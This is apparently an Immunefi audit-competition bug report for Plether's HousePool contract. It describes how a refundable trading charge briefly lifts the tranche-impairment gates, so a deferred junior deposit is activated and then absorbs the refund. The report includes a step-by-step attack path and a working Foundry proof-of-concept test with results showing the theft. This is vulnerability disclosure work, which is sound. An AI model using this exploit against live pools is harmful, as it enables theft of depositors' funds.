# \#99271 [SC-Critical] A refundable VPI charge restores an impaired Senior / wiped Junior for one settlement, so a deferred junior deposit is activated and then pays that charge back to the trader

**Submitted on Nov 12th 2026 at 19:19:50 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99271
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

When Junior is wiped or Senior is below its high-water mark, `settleLpEpoch` deliberately does not activate matured LP deposits. The deposit stays in escrow and the depositor can cancel it. Both checks read principals derived from `physicalAssets`.

A skew-increasing open pays a VPI charge `C` into pool cash, so `physicalAssets` goes up by `C`. But `C` is refundable: when the position closes, the skew-reducing VPI delta pays it back. If an open position's charge is in the pool at settlement time, the reconcile treats `C` as revenue. Senior is restored to its HWM, Junior becomes non-zero, and both gates open for that one settlement. The deferred junior deposit is activated into a junior book that is worth almost nothing, so the depositor owns ~100 % of Junior. When the position closes, the refund is booked as a pool loss. Junior absorbs it first, and Junior is now the depositor's money.

### Vulnerability Details

**1. The gates.** Matured entries are deferred while Senior is impaired or Junior is wiped:

```solidity
// HousePoolTrancheGateLib.sol:36  (via HousePool._entriesMaySettle, HousePool.sol:908)
if (projectedSeniorPrincipal < projectedSeniorHighWaterMark) {
    return false;
}

// HousePool.sol:917-920
bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

Both read `seniorPrincipal` / `juniorPrincipal` right after `_reconcile` (`HousePool.sol:835`). The reconcile is based on `buildReconcileSnapshot` (`HousePoolAccountingLib.sol:60-78`), where `distributable = physicalAssets + terminalDelta − claims`. This snapshot has no term for VPI that is still refundable.

**2. The charge enters NAV.** On a skew-increasing open, the positive trade cost goes into pool cash and `physicalAssets` (`CfdEnginePlanLib.sol:720-724`, `:753`). The reconcile then sends it through `distributeRevenue` (`HousePoolWaterfallAccountingLib.sol:140-159`). Senior is restored first by `i = min(C, HWM − seniorPrincipal)`, and Junior gets `j = C − i`. Both gates now pass.

**3. The charge comes back out.** On close, `CloseAccountingLib.sol:107-118` computes a negative VPI delta (skew reduction). It clamps the delta only so that the lifetime VPI does not go below zero, so the refund `R` can be up to `C`. The pool books `R` as a loss, and `absorbLoss` (`HousePoolWaterfallAccountingLib.sol:168-185`) takes it from Junior first.

**4. Who pays.** At activation, Junior is priced at `j / N`, where `j` is small and `N` is the large wiped supply. A depositor of `X` gets a fraction `X / (X + j) ≈ 1` of Junior. So almost all of `R` is paid by the depositor, whatever `X` is. Senior keeps `i`, and the old junior holders keep about `j`.

The design intends these deposits to stay deferred and cancellable: `TrancheVault.cancelPendingDeposit` (`TrancheVault.sol:851-855`) allows a cancel exactly while `isSeniorImpairedAfterPendingDepositReconcile()` or `_projectedTerminalWipe()` is true, and `packages/perps/SECURITY.md:494` and `:880` describe Senior impairment / projected wipe as the escrow-recovery state. `SECURITY.md:872` says anticipated VPI does not inflate symmetric NAV, but the cash from a positive charge is counted in `physicalAssets`.

### Attack Path

1. A market move wipes Junior (Senior impaired by `i ≈ 0–1k`). `canSettleDepositEntries()` returns `false`. VIC's queued junior deposit is deferred and can be cancelled.
2. At `boundary − 60 s`, ATT (holder of 60 % of the wiped junior supply) self-executes a skew-increasing LONG through the Router and pays `C ≈ 3,174`. `canSettleDepositEntries()` now returns `true`.
3. At the boundary, anyone calls `router.settleLpEpoch`. Senior is restored, Junior = `C − i`, and VIC's deposit is activated.
4. At `boundary + 30 s`, ATT closes and receives the refund `R`. Junior (≈ VIC) absorbs it.

An honest trader whose skew-increasing position is open across the settlement causes the same transfer, with no attacker needed.

### Impact Details

Release risk parameters (vpiFactor 0.01, maxSkewRatio 0.4). Senior 4M, Junior 1M (ATT 600k / HON 400k). Every number is a differential: the attack twin minus a base twin from the same snapshot without the open.

| Case | Senior impairment `i` | Charge `C` | VIC (victim) | Senior LP | Old junior (ATT+HON) | ATT trader leg | ATT total |
|---|---|---|---|---|---|---|---|
| Junior wiped only, X = 100k | ~0 | 3,173.76 | **−2,566.15** | +7.40 | +3,082.32 | −989.14 | **+860.25** |
| Senior impaired, X = 500k | 933.01 | 3,175.26 | **−2,412.11** | +1,006.15 | +2,156.55 | −1,215.87 | +78.05 |

- In the base twin, the settlement makes no progress and VIC keeps the full 500,000.00 / 100,000.00 escrow. In the attack twin, VIC's deposit is activated in full and VIC ends with less.
- Loss per event is about `C`, and it does not grow with the deposit size. At the skew cap, `C ≤ k·(0.4D)²/(2D) = 0.08 % · D`, which is about 4k USDG on a 5M pool and scales linearly with depth.
- Invariant broken: matured LP entries must not activate while Senior is impaired or Junior is wiped.
- Precondition: Junior must already be wiped (with Senior impairment below `C`). The open/close leg itself needs no price move.

### Mitigation

Evaluate the binary entry gates (Senior impairment, Junior wipe, deficit) net of the refundable VPI still held by the pool for open positions, i.e. `Σ max(vpiAccrued, 0)` over open positions. A simpler alternative: in the settlement that clears a Junior wipe or Senior impairment, keep entries deferred for one more epoch unless the restoration is backed by realised revenue.

### References

- `packages/perps/src/HousePool.sol:835` — `_reconcile` before the gates
- `packages/perps/src/HousePool.sol:908-912` — `_entriesMaySettle` defers entries
- `packages/perps/src/HousePool.sol:917-920` — `juniorActivationDeferred`
- `packages/perps/src/libraries/HousePoolTrancheGateLib.sol:36` — Senior-impairment gate
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` — reconcile snapshot, no refundable-VPI term
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:720-724`, `:753` — positive VPI charge into pool cash / `physicalAssets`
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159` — `distributeRevenue` (Senior first, then Junior)
- `packages/perps/src/libraries/CloseAccountingLib.sol:107-118` — refund on close, clamped only at lifetime zero
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:168-185` — `absorbLoss` (Junior first)
- `packages/perps/src/TrancheVault.sol:851-855` — escrow cancellable while Senior impaired / projected wipe

## Proof of Concept

## Proof of Concept

Uses only the repo fixture `BasePerpTest` with release risk parameters and the release Senior cap (40M / 80 %, set through the normal owner timelock in `setUp` before any position exists). Every trade is a self-executed order through the real `OrderRouter` (`commitOrder` + `executeOrder`), and the settlement with open positions goes through the permissionless `router.settleLpEpoch`. No role is pranked and no storage is written directly.

Each test runs two twins from the same snapshot: base (no open before the settlement) and attack (with the skew-increasing open). Everything else is identical.

- `test_G2_juniorWipeOnly_attackerProfit`: Junior wiped, Senior not impaired. Attacker profit and victim loss after all fees.
- `test_G2_impairedEntryGate_chargeToggle`: Junior wiped and Senior impaired by ~933 USDG.

Save as `packages/perps/test/perps/audit/VpiGateToggle.t.sol` and run from `plether-core/`:

```
forge test --root packages/perps --match-path test/perps/audit/VpiGateToggle.t.sol --gas-limit 100000000000 --disable-block-gas-limit -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A refundable skew-increasing VPI charge lifts the senior-impairment / junior-wipe entry gate for one
///         settlement. All trades are self-executed through the real Router; LP settlement through router.settleLpEpoch when
///         positions are open (permissionless pool.settleLpEpoch(0,0) otherwise). No pranked roles, no stdstore.
contract VpiGateTogglePoC is BasePerpTest {

    address internal constant SEN = address(0x5E1); // senior LP
    address internal constant VIC = address(0xB1C7); // queued junior depositor (G2 victim)
    address internal constant ATT = address(0xA77AC4); // attacker: junior LP + toggling trader
    address internal constant HON = address(0x40E5); // honest junior LP
    address internal constant BG = address(0xB6B6); // honest LONG trader

    uint256 internal stagedBasketPrice = 100_000_000;
    uint256 internal stagedBasketTime = SETUP_TIMESTAMP;
    uint256 internal curPrice = 1e8;

    // ---------------------------------------------------------------- config (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory cfg = _currentPoolConfig();
        cfg.maxSeniorExposureAssets = 40_000_000e6;
        cfg.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(cfg);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    // ---------------------------------------------------------------- helpers

    function _requestDeposit(
        TrancheVault vault,
        address owner,
        uint256 assets
    ) internal returns (uint256 requestId) {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        uint256 requestId,
        address controller
    ) internal returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(requestId, controller);
        assertGt(assets, 0, "deposit settled");
        vm.prank(controller);
        shares = vault.claimDeposit(requestId, assets, controller, controller);
    }

    function _setBasket(
        uint256 price,
        uint256 publishTime
    ) internal {
        stagedBasketPrice = price;
        stagedBasketTime = publishTime;
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime);
    }

    function _basketUpdate() internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(stagedBasketPrice)), 0, -8, stagedBasketTime, 0)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _refreshMark() internal {
        _setBasket(curPrice, vm.getBlockTimestamp());
        router.updateMarkPrice(_basketUpdate());
    }

    function _routerTrade(
        address who,
        CfdTypes.Side side,
        uint256 size,
        bool isClose
    ) internal returns (uint256 funded) {
        uint256 margin;
        if (!isClose) {
            margin = (size / 1e12) / 20; // 5 % margin at 1.00
            funded = margin * 2;
            _fundTrader(who, funded);
        }
        _refreshMark();
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory upd = _mockPythUpdateData(curPrice);
        vm.prank(who);
        router.executeOrder(id, upd);
    }

    function _idleStep() internal {
        _refreshMark();
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _posSize(
        address who
    ) internal view returns (uint256 sz) {
        (sz,,,,,,) = engine.positions(who);
    }

    function _vpiAccrued(
        address who
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(who);
    }

    function _pendSen() internal view returns (uint256 s) {
        (s,,,) = pool.getPendingTrancheState();
    }

    function _pendJr() internal view returns (uint256 j) {
        (, j,,) = pool.getPendingTrancheState();
    }

    function _probe(string memory tag) internal view {
        IHousePool.PoolLiquidityView memory v = pool.getPoolLiquidityView();
        console2.log(tag);
        console2.log("  deficit / unassigned", v.currentTerminalDeficitAssets, pool.unassignedAssets());
        console2.log("  seniorImpairedPending / markFresh", pool.isSeniorImpairedAfterPendingDepositReconcile(), v.markFresh);
        console2.log("  canAcceptJunior / canAcceptOrdinary", pool.canAcceptTrancheDeposits(false), pool.canAcceptOrdinaryDeposits());
        console2.log("  pendingJr / jrSupply", _pendJr(), juniorVault.totalSupply());
    }

    function _logUsd(
        string memory k,
        int256 v
    ) internal pure {
        int256 cents = v / 1e4;
        uint256 abs = cents < 0 ? uint256(-cents) : uint256(cents);
        console2.log(string.concat(k, cents < 0 ? " -" : " "), abs / 100, abs % 100);
    }

    function _u(
        string memory k,
        uint256 v
    ) internal pure {
        _logUsd(k, int256(v));
    }

    /// junior ATT/HON, then senior SEN filled to `seniorAmt` (capped by capacity). Returns shares.
    function _seedBook(
        uint256 attJr,
        uint256 honJr,
        uint256 seniorAmt
    ) internal returns (uint256 attShares, uint256 honShares, uint256 senShares) {
        uint256 idA = _requestDeposit(juniorVault, ATT, attJr);
        uint256 idH = honJr != 0 ? _requestDeposit(juniorVault, HON, honJr) : 0;
        vm.warp(pool.lpEpochStart(idA));
        _refreshMark();
        pool.settleLpEpoch(0, 0);
        attShares = _claimDeposit(juniorVault, idA, ATT);
        if (idH != 0) honShares = _claimDeposit(juniorVault, idH, HON);

        uint256 cap = pool.getSeniorDepositCapacity();
        uint256 amt = seniorAmt < cap ? seniorAmt : cap;
        uint256 idS = _requestDeposit(seniorVault, SEN, amt);
        vm.warp(pool.lpEpochStart(idS));
        _refreshMark();
        pool.settleLpEpoch(0, 0);
        senShares = _claimDeposit(seniorVault, idS, SEN);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
    }

    // =============================================================================================================
    // Senior-impairment / junior-wipe entry gate (HousePool.sol:908 _entriesMaySettle, :917 juniorActivationDeferred,
    //     HousePoolTrancheGateLib.sol:36 seniorPrincipal < HWM). A refundable skew-increasing VPI charge
    //     restores senior and lifts junior from 0 for exactly one settlement, so deferred deposits activate.
    // =============================================================================================================

    struct G2Res {
        uint256 impairmentBefore; // HWM - pending senior principal right before the toggle
        uint256 jrBefore; // pending junior principal right before the toggle
        bool gateBefore; // canSettleDepositEntries before toggle
        bool gateAfterOpen; // canSettleDepositEntries after the attacker open
        uint256 charge; // attacker vpiAccrued (positive charge)
        uint256 attSize;
        bool settleOk;
        uint256 vicActivated; // VIC deposit assets finalized at that settle
        uint256 senPrincipalAfterSettle;
        uint256 jrPrincipalAfterSettle;
        uint256 vicValue; // VIC end value (activated: share value; else: recoverable escrow)
        uint256 attJrValue;
        uint256 honJrValue;
        uint256 senValue;
        int256 attTraderNet;
        uint256 senPrincipalEnd;
        uint256 hwmEnd;
        uint256 jrPrincipalEnd;
        uint256 price;
        uint256 depth;
    }

    function _g2(
        bool attack,
        uint256 targetImpairment,
        uint256 vicAmt
    ) internal returns (G2Res memory r) {
        (uint256 attShares, uint256 honShares, uint256 senShares) = _seedBook(600_000e6, 400_000e6, 4_000_000e6);

        uint256 bgSize = 1_800_000e18;
        _routerTrade(BG, CfdTypes.Side.LONG, bgSize, false);
        require(_posSize(BG) == bgSize, "bg open");

        // queued junior deposit, requested while the pool is healthy
        uint256 rid = _requestDeposit(juniorVault, VIC, vicAmt);
        uint256 boundary = pool.lpEpochStart(rid);

        // precondition: market move against LPs wipes junior and impairs senior by ~targetImpairment
        vm.warp(boundary - 601);
        _refreshMark();
        uint256 jr = _pendJr();
        uint256 drop = (jr + targetImpairment) * 1e20 / bgSize;
        curPrice = 1e8 - drop;
        r.price = curPrice;
        vm.warp(boundary - 600);
        _refreshMark();
        r.jrBefore = _pendJr();
        uint256 hwm = pool.seniorHighWaterMark();
        uint256 ps = _pendSen();
        r.impairmentBefore = hwm > ps ? hwm - ps : 0;
        r.gateBefore = pool.canSettleDepositEntries();
        _probe("probe before toggle");

        // attacker toggles with a skew-increasing LONG (refundable positive VPI charge)
        vm.warp(boundary - 60);
        uint256 funded;
        r.depth = pool.totalAssets();
        if (attack) {
            uint256 targetSkew = r.depth * 39 / 100; // assets
            uint256 bgAssets = bgSize * curPrice / 1e8 / 1e12;
            uint256 attAssets = targetSkew - bgAssets;
            uint256 attSize = (attAssets * 1e12 * 1e8 / curPrice) / 100e18 * 100e18;
            r.attSize = attSize;
            funded = _routerTrade(ATT, CfdTypes.Side.LONG, attSize, false);
            require(_posSize(ATT) == attSize, "att open");
            r.charge = uint256(_vpiAccrued(ATT));
        } else {
            _idleStep();
        }
        r.gateAfterOpen = pool.canSettleDepositEntries();
        _probe("probe after toggle step");

        vm.warp(boundary);
        _setBasket(curPrice, boundary);
        bytes[] memory upd = _basketUpdate();
        try router.settleLpEpoch(upd) {
            r.settleOk = true;
        } catch {
            r.settleOk = false;
        }
        r.vicActivated = juniorVault.claimableDepositRequest(rid, VIC);
        r.senPrincipalAfterSettle = pool.seniorPrincipal();
        r.jrPrincipalAfterSettle = pool.juniorPrincipal();

        // attacker closes: lifetime clamp refunds up to the accrued charge
        vm.warp(boundary + 30);
        if (attack) {
            _routerTrade(ATT, CfdTypes.Side.LONG, r.attSize, true);
            require(_posSize(ATT) == 0, "att close");
        } else {
            _idleStep();
        }

        if (r.vicActivated != 0) {
            uint256 vs = _claimDeposit(juniorVault, rid, VIC);
            r.vicValue = juniorVault.convertToAssets(vs);
        } else {
            r.vicValue = juniorVault.pendingDepositRequest(rid, VIC); // still escrowed, cancellable while impaired
        }
        r.attJrValue = juniorVault.convertToAssets(attShares);
        r.honJrValue = juniorVault.convertToAssets(honShares);
        r.senValue = seniorVault.convertToAssets(senShares);
        r.attTraderNet = int256(clearinghouse.balanceAssets(ATT)) - int256(funded);
        r.senPrincipalEnd = _pendSen();
        r.hwmEnd = pool.seniorHighWaterMark();
        r.jrPrincipalEnd = _pendJr();
    }

    function _logG2(
        string memory tag,
        G2Res memory r
    ) internal pure {
        console2.log("-----", tag);
        console2.log("price (1e8)", r.price);
        _u("depth D", r.depth);
        _u("pending junior before toggle", r.jrBefore);
        _u("senior impairment before toggle", r.impairmentBefore);
        console2.log("canSettleDepositEntries before / after open", r.gateBefore, r.gateAfterOpen);
        console2.log("attacker LONG size (1e18 USD)", r.attSize / 1e18);
        _u("attacker VPI charge C", r.charge);
        console2.log("settle succeeded", r.settleOk);
        _u("VIC deposit activated at settle", r.vicActivated);
        _u("seniorPrincipal after settle", r.senPrincipalAfterSettle);
        _u("juniorPrincipal after settle", r.jrPrincipalAfterSettle);
        _u("VIC end value", r.vicValue);
        _u("ATT junior value", r.attJrValue);
        _u("HON junior value", r.honJrValue);
        _u("SEN senior value", r.senValue);
        _logUsd("ATT trader net", r.attTraderNet);
        _u("senior principal end", r.senPrincipalEnd);
        _u("senior HWM end", r.hwmEnd);
        _u("junior principal end", r.jrPrincipalEnd);
    }

    function _g2Run(
        uint256 targetImpairment,
        uint256 vicAmt
    ) internal returns (G2Res memory b, G2Res memory a) {
        uint256 snap = vm.snapshotState();
        b = _g2(false, targetImpairment, vicAmt);
        vm.revertToState(snap);
        curPrice = 1e8;
        a = _g2(true, targetImpairment, vicAmt);
        vm.revertToStateAndDelete(snap);
        curPrice = 1e8;
    }

    function _g2Report(
        G2Res memory b,
        G2Res memory a
    ) internal pure {
        _logG2("base", b);
        _logG2("attack", a);
        console2.log("===== G2 differentials (attack - base)");
        _logUsd("VIC (queued junior depositor)", int256(a.vicValue) - int256(b.vicValue));
        _logUsd("SEN (senior LP)", int256(a.senValue) - int256(b.senValue));
        _logUsd("ATT old junior stake", int256(a.attJrValue) - int256(b.attJrValue));
        _logUsd("HON old junior stake", int256(a.honJrValue) - int256(b.honJrValue));
        _logUsd("ATT trader net", a.attTraderNet);
        _logUsd(
            "ATT total (stake + trader)", int256(a.attJrValue) - int256(b.attJrValue) + a.attTraderNet
        );
    }

    function test_G2_impairedEntryGate_chargeToggle() public {
        (G2Res memory b, G2Res memory a) = _g2Run(1000e6, 500_000e6);
        _g2Report(b, a);
        // gate must be closed before the toggle in both twins
        assertFalse(b.gateBefore, "base gate closed");
        assertFalse(a.gateBefore, "atk gate closed");
        assertGt(a.impairmentBefore, 0, "senior impaired");
        assertEq(a.jrBefore, 0, "junior wiped");
        // the refundable charge opens it
        assertTrue(a.gateAfterOpen, "toggle opens gate");
        assertEq(b.vicActivated, 0, "base: deposit deferred");
        assertEq(a.vicActivated, 500_000e6, "atk: deposit activated");
        assertLt(a.vicValue, b.vicValue, "victim loses");
    }

    /// Junior wiped exactly (senior unimpaired): gate = juniorActivationDeferred (HousePool.sol:917). Attacker holds
    /// 60 % of the wiped junior supply.
    function test_G2_juniorWipeOnly_attackerProfit() public {
        (G2Res memory b, G2Res memory a) = _g2Run(1e6, 100_000e6);
        _g2Report(b, a);
        assertEq(a.jrBefore, 0, "junior wiped");
        assertFalse(a.gateBefore, "gate closed");
        assertTrue(a.gateAfterOpen, "toggle opens gate");
        assertEq(b.vicActivated, 0, "base deferred");
        assertEq(a.vicActivated, 100_000e6, "atk activated");
        int256 attTotal = int256(a.attJrValue) - int256(b.attJrValue) + a.attTraderNet;
        assertGt(attTotal, 0, "attacker profits");
        assertLt(a.vicValue + 2000e6, b.vicValue, "victim loses > 2,000 USDG");
    }

}
```

### Result

```
Ran 2 tests for test/perps/audit/VpiGateToggle.t.sol:VpiGateTogglePoC
[PASS] test_G2_impairedEntryGate_chargeToggle() (gas: 18671365)
Logs:
  probe before toggle
    seniorImpairedPending / markFresh true true
    canAcceptJunior / canAcceptOrdinary false true
    pendingJr / jrSupply 0 1001667110739380
  probe after toggle step
    seniorImpairedPending / markFresh false true
    canAcceptJunior / canAcceptOrdinary true true
    pendingJr / jrSupply 2169771239 1001667110739380
  senior impairment before toggle  933 1
  canSettleDepositEntries before / after open false true
  attacker VPI charge C  3175 26
  settle succeeded true                       (base twin: false)
  VIC deposit activated at settle  500000 0   (base twin: 0 0)
  VIC end value  497587 88                    (base twin: 500000 0)
  ===== G2 differentials (attack - base)
  VIC (queued junior depositor) - 2412 11
  SEN (senior LP)  1006 15
  ATT old junior stake  1293 93
  HON old junior stake  862 62
  ATT trader net - 1215 87
  ATT total (stake + trader)  78 5

[PASS] test_G2_juniorWipeOnly_attackerProfit() (gas: 18310396)
Logs:
  attacker VPI charge C  3173 76
  ===== G2 differentials (attack - base)
  VIC (queued junior depositor) - 2566 15
  SEN (senior LP)  7 40
  ATT old junior stake  1849 39
  HON old junior stake  1232 93
  ATT trader net - 989 14
  ATT total (stake + trader)  860 25
```

(Amounts are printed as `<USDG> <cents>`. Logs are an excerpt of the attack twin; the values in parentheses are the base twin, added from its own log lines.)

